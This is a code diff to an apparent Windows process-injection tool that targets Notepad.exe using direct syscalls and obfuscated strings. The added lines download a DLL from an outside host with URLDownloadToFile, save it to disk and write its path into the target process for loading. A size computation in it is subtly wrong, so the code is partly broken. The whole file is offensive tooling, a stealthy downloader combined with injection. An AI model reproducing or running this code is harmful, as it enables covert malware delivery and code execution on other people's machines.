@@ -6,6 +6,8 @@
 #include "structures.h"
 #include "structs.h"
 #include "obfuscate.h"
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
 
 #define STATUS_SUCCESS 0
 
@@ -223,9 +225,16 @@ int main(int argc, char* argv[])
 	DWORD oldProtect;
 
 	DWORD targetPid = GetPIDByName(L"Notepad.exe");
-	const char* pathDLL = AY_OBFUSCATE("C:\\Users\\luisv\\Desktop\\calc.dll");
 
-	SIZE_T szAllocation = sizeof(pathDLL) + 1;
+	string dwnld_URL = (string)AY_OBFUSCATE("http://172.16.62.228:8080/calc.dll");
+	string savepath = (string)AY_OBFUSCATE("C:\\Users\\luisv\\Desktop\\calc.dll");
+	HRESULT hres = URLDownloadToFile(NULL, wstring(dwnld_URL.begin(), dwnld_URL.end()).c_str(), wstring(savepath.begin(), savepath.end()).c_str(), 0, NULL);
+	if (hres != S_OK) {
+		printf(AY_OBFUSCATE("Failed to download DLL\n"));
+		return FALSE;
+	}
+	
+	SIZE_T szAllocation = sizeof(&savepath) + 1;
 
 	if (!EstablishSyscalls())
 		return 1;
@@ -246,7 +255,7 @@ int main(int argc, char* argv[])
 	}
 
 	printf(AY_OBFUSCATE("Writing DLL path to 0x%p\n"), lpAllocationStart);
-	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)pathDLL, szAllocation, NULL);
+	status = _NtWriteVirtualMemory(hProc, lpAllocationStart, (PVOID)savepath.c_str(), szAllocation, NULL);
 	if (status != STATUS_SUCCESS)
 	{
 		printf(AY_OBFUSCATE("Failed to write to allocated memory\n"));
